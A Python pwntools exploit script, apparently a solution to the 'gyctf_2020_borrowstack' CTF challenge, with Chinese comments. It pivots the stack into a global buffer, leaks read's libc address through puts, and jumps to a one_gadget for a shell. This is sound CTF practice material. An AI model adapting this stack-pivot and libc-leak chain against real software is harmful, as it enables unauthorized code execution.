from pwn import *
from LibcSearcher import *

context.arch = 'amd64'

p = process(['./gyctf_2020_borrowstack'], env={'LD_PRELOAD': '../../libc/libc-2.23.so'})
elf = ELF('./gyctf_2020_borrowstack')
bank_address = 0x601080
bank_offset = 0x38  # 加上偏移，远离GOT区域，不然直接调用puts会写烂GOT区域(bank_address上面就是GOT区域)
new_bank = bank_address + bank_offset

leave_ret = 0x400699
pop_rdi_ret = 0x400703

# 栈迁移到borrowed_stack的位置
migrate_chain = ROP([elf])
migrate_chain.migrate(new_bank)
p.recvline()
p.send(flat({0x58: migrate_chain.chain()}))

# 泄露read的地址，leak_chain的大小为0x48
leak_chain = ROP([elf])
leak_chain.puts(elf.got['read'])
leak_chain.read(0, new_bank + 0x48)
p.recvline()
p.send(flat({bank_offset: leak_chain.chain()}))

# 计算one_gadget
read_address = unpack(p.recv(6).ljust(8, b'\x00'))
p.recvline()  # 收掉后面的换行符
libc = LibcSearcher('read', read_address)
libc_base = read_address - libc.dump('read')
one_gadget_address = libc_base + 0x4526a

# 在leak_chain后面继续组shell_chain
shell_chain = ROP([elf])
shell_chain.raw(one_gadget_address)
p.send(shell_chain.chain())
p.interactive()
